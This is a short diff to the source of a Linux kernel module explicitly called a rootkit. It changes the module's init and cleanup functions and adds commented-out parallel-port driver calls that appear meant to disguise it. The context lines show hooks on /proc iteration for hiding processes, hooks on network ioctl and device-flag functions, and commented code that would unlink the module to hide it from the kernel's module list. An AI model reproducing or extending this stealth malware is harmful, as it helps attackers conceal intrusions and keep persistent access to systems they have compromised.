@@ -974,12 +974,18 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
     return ret;
 }
 
-static int init_rootkit(void)
+// extern int parport_pc_init(void);
+// extern void parport_pc_exit(void);
+
+
+__init int init_rootkit(void)
 {
     DEBUG("begin the init function\n");
 
     // list_del_init(&__this_module.list);
     // kobject_del(__this_module.holders_dir->parent);
+
+    // parport_pc_init();
 
     // Hook /proc for hiding processes
     proc_iterate = get_vfs_iterate_shared("/proc");
@@ -1015,7 +1021,7 @@ static int init_rootkit(void)
     return 0;
 }
 
-static void cleanup_rootkit(void)
+__exit void cleanup_rootkit(void)
 {
     hook_stop(inet_ioctl);
     hook_stop(dev_get_flags);
@@ -1026,6 +1032,7 @@ static void cleanup_rootkit(void)
     hook_stop(root_iterate);
     hook_stop(proc_iterate);
     DEBUG("clean up the module\n");
+    // parport_pc_exit();
 }
 module_init(init_rootkit);
 module_exit(cleanup_rootkit);
